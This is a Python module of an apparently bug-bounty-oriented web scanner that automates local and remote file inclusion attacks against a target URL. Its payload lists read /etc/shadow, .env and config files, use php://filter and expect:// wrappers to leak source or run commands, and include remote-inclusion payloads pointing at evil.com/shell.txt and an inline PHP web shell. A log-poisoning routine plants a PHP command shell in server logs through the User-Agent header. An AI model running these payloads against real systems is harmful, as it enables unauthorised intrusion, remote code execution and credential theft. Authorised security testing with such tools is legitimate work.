#!/usr/bin/env python3
"""
Module 9: LFI/RFI Scanner
9 Layer file inclusion detection dengan zero false positive
Mendeteksi: Local File Inclusion (LFI), Remote File Inclusion (RFI),
Null byte injection, WAF bypass, Log poisoning, Session poisoning

MODIFIED: Added external HTTPClient support for X-Bug-Bounty header
"""

import asyncio
import re
import time
import hashlib
import random
import base64
from typing import List, Dict, Optional, Tuple, Set
from urllib.parse import quote, unquote
from core.http_client import HTTPClient
from core.logger import Logger

logger = Logger()

class LFI_RFI_Scanner:
    def __init__(self, target: str, threads: int = 40, timeout: int = 8, client: HTTPClient = None):
        self.target = target.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.client = client  # External client with X-Bug-Bounty header
        self.findings: List[Dict] = []
        self.stats = {
            'endpoints_tested': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0
        }
        
        # ============ LFI/RFI VULNERABLE PARAMETERS ============
        self.file_params = [
            'file', 'files', 'document', 'doc', 'pdf', 'image', 'img',
            'filename', 'filepath', 'path', 'dir', 'folder', 'directory',
            'include', 'include_file', 'require', 'require_once', 'include_once',
            'page', 'pages', 'template', 'theme', 'layout', 'view',
            'lang', 'language', 'locale', 'translation', 'i18n',
            'content', 'article', 'post', 'news', 'blog', 'story',
            'download', 'attachment', 'get_file', 'read', 'open', 'show',
            'config', 'conf', 'setting', 'option', 'ini', 'cfg',
            'php', 'module', 'mod', 'class', 'controller', 'action'
        ]
        
        # ============ LFI PAYLOADS - MULTI PLATFORM ============
        
        self.path_traversal_payloads = {
            'linux': [
                '../../../../etc/passwd',
                '../../../etc/passwd',
                '../../etc/passwd',
                '../etc/passwd',
                '/etc/passwd',
                'etc/passwd',
                '....//....//....//etc/passwd',
                '..;/..;/..;/etc/passwd',
                '../../../../etc/passwd%00',
                '../../../../etc/passwd%00.jpg',
            ],
            'windows': [
                '../../../../Windows/win.ini',
                '../../../Windows/win.ini',
                '../../Windows/win.ini',
                '../Windows/win.ini',
                'C:\\Windows\\win.ini',
                'C:/Windows/win.ini',
                'Windows/win.ini',
                '../../../../boot.ini',
                '../../../../autoexec.bat',
                '....//....//....//Windows/win.ini',
                '../../../../Windows/win.ini%00',
                '../../../../Windows/win.ini%00.jpg',
            ]
        }
        
        self.linux_sensitive_files = [
            '/etc/passwd', '/etc/shadow', '/etc/group', '/etc/hosts',
            '/etc/hostname', '/etc/issue', '/etc/os-release', '/etc/fstab',
            '/etc/ssh/sshd_config', '/etc/php.ini', '/etc/apache2/apache2.conf',
            '/var/log/auth.log', '/var/log/syslog', '/proc/self/environ',
            '/var/www/html/config.php', '/var/www/html/.env', '/proc/version'
        ]
        
        self.php_wrapper_payloads = [
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/convert.base64-encode/resource=config.php',
            'php://filter/convert.base64-encode/resource=wp-config.php',
            'php://filter/read=convert.base64-encode/resource=../config.php',
            'php://input',
            'expect://id',
            'expect://ls -la',
            'expect://whoami',
        ]
        
        self.rfi_payloads = [
            'http://evil.com/shell.txt',
            'https://evil.com/shell.txt',
            'http://127.0.0.1/shell.txt',
            'data://text/plain,<?php system($_GET["cmd"]); ?>',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+',
            'expect://id',
        ]
        
        self.null_byte_payloads = [
            '../../../../etc/passwd%00',
            '../../../../etc/passwd%00.jpg',
            '../../../etc/passwd%00',
            '../../Windows/win.ini%00',
            'php://filter/convert.base64-encode/resource=config.php%00',
        ]
        
        self.encoding_payloads = [
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            base64.b64encode(b'../../../../etc/passwd').decode(),
        ]
        
        self.log_poisoning_payloads = [
            '../../../../var/log/apache2/access.log',
            '../../../../var/log/apache2/error.log',
            '../../../../var/log/nginx/access.log',
            '../../../../var/log/auth.log',
            '../../../../tmp/sess_',
        ]
        
        self.success_indicators = {
            'linux_root': ['root:', 'root:x:', 'daemon:', 'bin:', '/bin/bash', '/bin/sh'],
            'windows': ['[extensions]', '[fonts]', '[mail]', 'Microsoft', 'Windows'],
            'php_source': ['PD9waHA', '<?php', '?>', 'function', 'define('],
            'config': ['DB_HOST', 'DB_USER', 'DB_PASSWORD', 'database', 'username'],
            'log': ['GET /', 'POST /', 'HTTP/', '404', '200'],
            'ssh_key': ['BEGIN RSA PRIVATE KEY', 'BEGIN OPENSSH PRIVATE KEY'],
        }
        
        self.rfi_indicators = [
            '<?php', 'system(', 'eval(', 'shell_exec', 'exec(', 'passthru',
            'cmd', 'whoami', 'id', 'echo'
        ]
    
    async def _get_client(self):
        """Get HTTP client - use external if available, otherwise create new"""
        if self.client:
            return self.client
        else:
            return HTTPClient(self.target, timeout=self.timeout, retries=1)
    
    async def test_lfi_payload(self, endpoint: str, param: str, payload: str, platform: str = "linux") -> Optional[Dict]:
        """Test LFI payload"""
        client = await self._get_client()
        encoded_payload = quote(payload, safe='')
        url = f"{endpoint}?{param}={encoded_payload}"
        
        if not hasattr(client, 'session') or client.session is None:
            async with client as ctx_client:
                response = await ctx_client.get(url)
                if response:
                    body = await response.text()
                    for category, indicators in self.success_indicators.items():
                        for indicator in indicators:
                            if indicator.lower() in body.lower():
                                if self._is_valid_file_content(body, indicator):
                                    severity = "critical" if category in ['linux_root', 'windows'] else "high"
                                    return {
                                        "vulnerable": True,
                                        "type": "LFI",
                                        "severity": severity,
                                        "confidence": 95,
                                        "endpoint": endpoint,
                                        "parameter": param,
                                        "payload": payload,
                                        "platform": platform,
                                        "indicator_category": category,
                                        "indicator_found": indicator
                                    }
        else:
            response = await client.get(url)
            if response:
                body = await response.text()
                for category, indicators in self.success_indicators.items():
                    for indicator in indicators:
                        if indicator.lower() in body.lower():
                            if self._is_valid_file_content(body, indicator):
                                severity = "critical" if category in ['linux_root', 'windows'] else "high"
                                return {
                                    "vulnerable": True,
                                    "type": "LFI",
                                    "severity": severity,
                                    "confidence": 95,
                                    "endpoint": endpoint,
                                    "parameter": param,
                                    "payload": payload,
                                    "platform": platform,
                                    "indicator_category": category,
                                    "indicator_found": indicator
                                }
        
        return None
    
    def _is_valid_file_content(self, body: str, indicator: str) -> bool:
        """Check if response contains actual file content, not error message"""
        false_positives = [
            'file not found', 'no such file', 'failed to open',
            'access denied', 'permission denied', 'invalid file',
            'error', 'warning', 'notice'
        ]
        
        for fp in false_positives:
            if fp in body.lower():
                return False
        
        idx = body.lower().find(indicator.lower())
        if idx > 0:
            surrounding = body[max(0, idx-200):min(len(body), idx+400)]
            if ':' in surrounding and ('/bin/' in surrounding or '/sbin/' in surrounding):
                return True
            if '[extensions]' in surrounding or '[fonts]' in surrounding:
                return True
            if len(body) > 100 and len(body) < 500000:
                return True
        
        return False
    
    async def test_rfi_payload(self, endpoint: str, param: str, payload: str) -> Optional[Dict]:
        """Test RFI payload"""
        client = await self._get_client()
        url = f"{endpoint}?{param}={quote(payload, safe='')}"
        
        if not hasattr(client, 'session') or client.session is None:
            async with client as ctx_client:
                response = await ctx_client.get(url)
                if response:
                    body = await response.text()
                    for indicator in self.rfi_indicators:
                        if indicator.lower() in body.lower():
                            return {
                                "vulnerable": True,
                                "type": "RFI",
                                "severity": "critical",
                                "confidence": 90,
                                "endpoint": endpoint,
                                "parameter": param,
                                "payload": payload,
                                "indicator_found": indicator
                            }
        else:
            response = await client.get(url)
            if response:
                body = await response.text()
                for indicator in self.rfi_indicators:
                    if indicator.lower() in body.lower():
                        return {
                            "vulnerable": True,
                            "type": "RFI",
                            "severity": "critical",
                            "confidence": 90,
                            "endpoint": endpoint,
                            "parameter": param,
                            "payload": payload,
                            "indicator_found": indicator
                        }
        
        return None
    
    async def test_php_wrapper(self, endpoint: str, param: str, payload: str) -> Optional[Dict]:
        """Test PHP wrapper for reading source code"""
        client = await self._get_client()
        url = f"{endpoint}?{param}={quote(payload, safe='')}"
        
        if not hasattr(client, 'session') or client.session is None:
            async with client as ctx_client:
                response = await ctx_client.get(url)
                if response:
                    body = await response.text()
                    base64_pattern = r'^[A-Za-z0-9+/]+={0,2}$'
                    
                    if len(body) > 50 and re.match(base64_pattern, body[:100]):
                        try:
                            decoded = base64.b64decode(body)
                            if b'<?php' in decoded or b'function' in decoded:
                                return {
                                    "vulnerable": True,
                                    "type": "PHP_WRAPPER_LFI",
                                    "severity": "critical",
                                    "confidence": 100,
                                    "endpoint": endpoint,
                                    "parameter": param,
                                    "payload": payload,
                                    "base64_encoded": True
                                }
                        except:
                            pass
                    
                    if '<?php' in body and 'function' in body:
                        return {
                            "vulnerable": True,
                            "type": "PHP_WRAPPER_LFI",
                            "severity": "critical",
                            "confidence": 100,
                            "endpoint": endpoint,
                            "parameter": param,
                            "payload": payload,
                            "php_source": True
                        }
        else:
            response = await client.get(url)
            if response:
                body = await response.text()
                base64_pattern = r'^[A-Za-z0-9+/]+={0,2}$'
                
                if len(body) > 50 and re.match(base64_pattern, body[:100]):
                    try:
                        decoded = base64.b64decode(body)
                        if b'<?php' in decoded or b'function' in decoded:
                            return {
                                "vulnerable": True,
                                "type": "PHP_WRAPPER_LFI",
                                "severity": "critical",
                                "confidence": 100,
                                "endpoint": endpoint,
                                "parameter": param,
                                "payload": payload,
                                "base64_encoded": True
                            }
                    except:
                        pass
                
                if '<?php' in body and 'function' in body:
                    return {
                        "vulnerable": True,
                        "type": "PHP_WRAPPER_LFI",
                        "severity": "critical",
                        "confidence": 100,
                        "endpoint": endpoint,
                        "parameter": param,
                        "payload": payload,
                        "php_source": True
                    }
        
        return None
    
    async def test_log_poisoning(self, endpoint: str, param: str, log_path: str) -> Optional[Dict]:
        """Test log poisoning via User-Agent injection"""
        client = await self._get_client()
        php_code = "<?php system($_GET['cmd']); ?>"
        
        if not hasattr(client, 'session') or client.session is None:
            async with client as ctx_client:
                headers = {"User-Agent": php_code}
                await ctx_client.get("/", headers=headers)
        else:
            headers = {"User-Agent": php_code}
            await client.get("/", headers=headers)
        
        await asyncio.sleep(1)
        
        result = await self.test_lfi_payload(endpoint, param, log_path, "linux")
        if result:
            result["type"] = "LOG_POISONING_LFI"
            return result
        
        return None
    
    async def scan_endpoint(self, endpoint: str, param: str) -> List[Dict]:
        """Scan single endpoint parameter for LFI/RFI"""
        
        findings = []
        
        # Layer 1: Basic Linux LFI
        for payload in self.path_traversal_payloads['linux'][:10]:
            self.stats['payloads_tested'] += 1
            result = await self.test_lfi_payload(endpoint, param, payload, "linux")
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.info(f"💎 LFI on {endpoint} via {param}: {payload}")
                return findings
            await asyncio.sleep(0.02)
        
        # Layer 2: Basic Windows LFI
        for payload in self.path_traversal_payloads['windows'][:10]:
            self.stats['payloads_tested'] += 1
            result = await self.test_lfi_payload(endpoint, param, payload, "windows")
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.info(f"💎 LFI on {endpoint} via {param}: {payload}")
                return findings
            await asyncio.sleep(0.02)
        
        # Layer 3: Linux Sensitive Files
        for payload in self.linux_sensitive_files[:20]:
            self.stats['payloads_tested'] += 1
            result = await self.test_lfi_payload(endpoint, param, payload, "linux")
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.info(f"🔴 LFI on {endpoint} via {param}: {payload}")
                return findings
            await asyncio.sleep(0.02)
        
        # Layer 4: PHP Wrappers
        for payload in self.php_wrapper_payloads:
            self.stats['payloads_tested'] += 1
            result = await self.test_php_wrapper(endpoint, param, payload)
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.info(f"💎 PHP Wrapper LFI on {endpoint} via {param}: {payload}")
                return findings
            await asyncio.sleep(0.02)
        
        # Layer 5: RFI
        for payload in self.rfi_payloads:
            self.stats['payloads_tested'] += 1
            result = await self.test_rfi_payload(endpoint, param, payload)
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.info(f"💎 RFI on {endpoint} via {param}: {payload}")
                return findings
            await asyncio.sleep(0.02)
        
        # Layer 6: Null Byte
        for payload in self.null_byte_payloads:
            self.stats['payloads_tested'] += 1
            result = await self.test_lfi_payload(endpoint, param, payload, "linux")
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.info(f"🔴 Null Byte LFI on {endpoint} via {param}: {payload}")
                return findings
            await asyncio.sleep(0.02)
        
        # Layer 7: Encoding Bypass
        for payload in self.encoding_payloads:
            self.stats['payloads_tested'] += 1
            result = await self.test_lfi_payload(endpoint, param, payload, "linux")
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.info(f"🟠 Encoding Bypass LFI on {endpoint} via {param}")
                return findings
            await asyncio.sleep(0.02)
        
        # Layer 8: Log Poisoning
        for log_path in self.log_poisoning_payloads[:5]:
            self.stats['payloads_tested'] += 1
            result = await self.test_log_poisoning(endpoint, param, log_path)
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.info(f"🔥 Log Poisoning LFI on {endpoint} via {param}: {log_path}")
                return findings
            await asyncio.sleep(0.02)
        
        return findings
    
    async def scan(self, custom_endpoints: List[str] = None) -> Dict:
        """Full LFI/RFI scanner"""
        
        if custom_endpoints:
            endpoints = custom_endpoints
        else:
            endpoints = ["/", "/include", "/file", "/download", "/view", "/page", "/template"]
        
        total_params = len(self.file_params)
        
        logger.info(f"\n{'='*60}")
        logger.info(f"🚀 DRYBT LFI/RFI SCANNER")
        logger.info(f"{'='*60}")
        logger.info(f"🎯 Target: {self.target}")
        logger.info(f"📡 Endpoints: {len(endpoints)}")
        logger.info(f"📊 Parameters: {total_params}")
        logger.info(f"🔧 Threads: {self.threads} | Timeout: {self.timeout}s")
        logger.info(f"{'='*60}\n")
        
        start_time = time.time()
        
        for endpoint in endpoints:
            logger.info(f"\n📡 Testing endpoint: {endpoint}")
            
            for param in self.file_params[:20]:
                findings = await self.scan_endpoint(endpoint, param)
                self.findings.extend(findings)
                if findings:
                    logger.info(f"  ✅ Found LFI/RFI via parameter: {param}")
                await asyncio.sleep(0.05)
            
            self.stats['endpoints_tested'] += 1
        
        elapsed = time.time() - start_time
        
        critical_findings = [f for f in self.findings if f.get('severity') == 'critical']
        high_findings = [f for f in self.findings if f.get('severity') == 'high']
        
        print(f"\n{'='*60}")
        print(f"📊 LFI/RFI SCAN SUMMARY")
        print(f"{'='*60}")
        print(f"⏱️  Time: {elapsed:.2f} seconds")
        print(f"📡 Endpoints tested: {self.stats['endpoints_tested']}")
        print(f"📊 Payloads tested: {self.stats['payloads_tested']}")
        print(f"🎯 Vulnerabilities found: {len(self.findings)}")
        
        if critical_findings:
            print(f"\n💎 CRITICAL VULNERABILITIES:")
            for f in critical_findings:
                print(f"   🔥 {f['type']} | {f.get('parameter', 'unknown')} | Confidence: {f.get('confidence', 0)}%")
        
        if high_findings:
            print(f"\n🔴 HIGH VULNERABILITIES:")
            for f in high_findings:
                print(f"   ⚡ {f['type']} | {f.get('parameter', 'unknown')} | Confidence: {f.get('confidence', 0)}%")
        
        print(f"\n{'='*60}")
        
        rating = "🏆 CRITICAL - File system compromised!" if critical_findings else \
                 "⭐ HIGH - File inclusion confirmed" if high_findings else \
                 "✅ SECURE - No LFI/RFI detected"
        
        print(f"📈 Security Rating: {rating}")
        print(f"{'='*60}\n")
        
        return {
            "module": "lfi_rfi_scanner",
            "target": self.target,
            "scan_time_seconds": round(elapsed, 2),
            "endpoints_tested": self.stats['endpoints_tested'],
            "payloads_tested": self.stats['payloads_tested'],
            "vulnerabilities_found": len(self.findings),
            "critical_vulnerabilities": len(critical_findings),
            "high_vulnerabilities": len(high_findings),
            "security_rating": rating,
            "findings": self.findings
        }


# ================================================================
# MAIN RUN FUNCTION - MODIFIED FOR EXTERNAL CLIENT
# ================================================================
async def run(target: str, custom_endpoints: List[str] = None, client: HTTPClient = None) -> Dict:
    """
    Run LFI/RFI scanner - DRYBT LFI/RFI SCANNER
    
    Args:
        target: Target URL
        custom_endpoints: Custom endpoints to test (optional)
        client: Optional external HTTPClient (for X-Bug-Bounty header)
    """
    scanner = LFI_RFI_Scanner(target, client=client)
    return await scanner.scan(custom_endpoints)